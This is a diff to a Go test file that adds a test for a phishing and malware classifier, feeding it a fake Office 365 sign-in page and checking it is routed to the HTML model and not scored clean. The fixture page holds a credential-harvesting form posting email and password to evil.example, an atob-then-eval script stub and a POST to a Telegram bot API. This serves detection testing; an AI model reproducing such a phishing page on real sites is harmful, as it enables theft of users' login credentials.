@@ -154,3 +154,25 @@ func TestCheckerReportsOnce(t *testing.T) {
 		t.Fatalf("lines %q", p.lines)
 	}
 }
+
+func TestHTMLPagesGoToTheHTMLModel(t *testing.T) {
+	kit := []byte(`<!DOCTYPE html><html><head><title>Microsoft Office 365 - Sign in</title></head><body>
+<form action="https://evil.example/next.php" method="post"><input type="email" name="u"><input type="password" name="p"></form>
+<script>var d=atob("` + strings.Repeat("QUJD", 400) + `");eval(d);window.location.href="https://x.example/";
+$.ajax({type:"POST",url:"https://api.telegram.org/bot1/sendMessage"})</script></body></html>`)
+	v, ok := Classify(nil, nil, kit)
+	if !ok || v.Kind != "html" || v.Engine != "html_lgbm" {
+		t.Fatalf("verdict %+v ok=%v", v, ok)
+	}
+	if v.Level == "clean" {
+		t.Errorf("a phishing kit page scored clean: %.3f", v.Score)
+	}
+	// a page saved under an .htm name without a markup start still goes there
+	if v, ok := ClassifyAt(nil, nil, []byte("hello"), `C:\Users\a\Downloads\x.htm`); !ok || v.Kind != "html" {
+		t.Fatalf("by name: %+v %v", v, ok)
+	}
+	// plain text is not scored
+	if _, ok := Classify(nil, nil, []byte("just some notes")); ok {
+		t.Fatal("plain text scored")
+	}
+}
